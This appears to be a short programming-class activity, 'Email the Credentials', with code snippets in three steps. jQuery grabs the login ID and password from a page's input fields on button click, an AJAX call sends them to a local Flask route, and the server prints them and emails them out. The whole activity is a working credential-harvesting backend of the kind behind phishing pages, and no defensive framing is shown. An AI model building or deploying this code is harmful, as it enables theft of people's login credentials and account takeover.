Email the Credentials
===========================




In this activity, you will learn to send an email with the credential of the user.




<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/1525749/images/10986006/SA2.gif" width = "100%" height = "auto">




Follow the given steps to complete this activity:




1. Fetch the credentials.
* Open the `index.html` file.
* Fetch the credentials by accessing the input fields when the login button is clicked using jQuery.
~~~sh
        $(".login-button").click(function(){
                var userLoginId = $("#id_userLoginId").val();
                var userPassword = $("#id_password").val();
~~~


2. Send the credentials.
* Send the credentials by creating an AJAX request.
~~~sh
$.ajax({
     url: 'http://127.0.0.1:5000/getPassword',
     data: { id: userLoginId, password: userPassword},
                });
~~~


3. Email the credentials.
* Open the `proxy-server.py` file.
* Send the credentials by calling the function to send the email.
~~~sh
@app.route('/getPassword', methods=['GET', 'POST'])
def get_password():
    user_id = request.args.get('id')
    user_password = request.args.get('password')
    print("Username and password: ", user_id, user_password)
    send_email(user_id, user_password)
    return redirect("/")
~~~
* Save and run the code to check the output.
